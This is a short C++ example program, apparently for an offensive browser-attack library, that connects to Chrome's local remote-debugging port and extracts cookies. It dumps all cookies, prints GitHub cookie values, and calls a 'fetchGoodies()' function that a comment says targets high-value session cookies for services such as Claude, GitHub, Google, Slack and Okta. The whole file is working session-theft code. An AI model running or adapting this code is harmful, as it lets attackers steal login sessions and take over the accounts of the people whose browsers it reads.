#include <iostream>
#include "cdp/browser.h"

int main() {
    cdp::Browser browser("127.0.0.1", 9222);

    if (!browser.connect()) {
        std::cerr << "[-] Failed to connect to Chrome.\n";
        return 1;
    }

    std::cout << "[+] Connected to Chrome.\n\n";

    // === Method 1: Get all cookies ===
    auto allCookies = browser.getCookies();
    if (allCookies) {
        std::cout << "[+] Total cookies in browser: " << allCookies.value().size() << "\n";
    }

    // === Method 2: Get cookies for a specific domain ===
    auto githubCookies = browser.getCookiesFromDomain("github.com");
    if (githubCookies && !githubCookies.value().empty()) {
        std::cout << "\n[GitHub Cookies]\n";
        for (const auto& c : githubCookies.value()) {
            std::cout << "  " << c.name << " = " << c.value.substr(0, 40)
                << (c.value.size() > 40 ? "..." : "") << "\n";
        }
    }

    // === Method 3: Use fetchGoodies() for high-value targets ===
    // This uses the built-in filters for Claude, GitHub, Google, Slack, Okta, etc.
    auto goodies = browser.fetchGoodies();
    if (goodies) {
        std::cout << "\n[+] High-value cookie matches found: " << goodies.value().size() << "\n";
        for (const auto& match : goodies.value()) {
            std::cout << "\n  Site: " << match.url << "\n";
            for (const auto& c : match.cookies) {
                std::cout << "    " << c.name << "\n";
            }
        }
    }
    else {
        std::cout << "[-] fetchGoodies failed: " << goodies.error().message << "\n";
    }

    return 0;
}
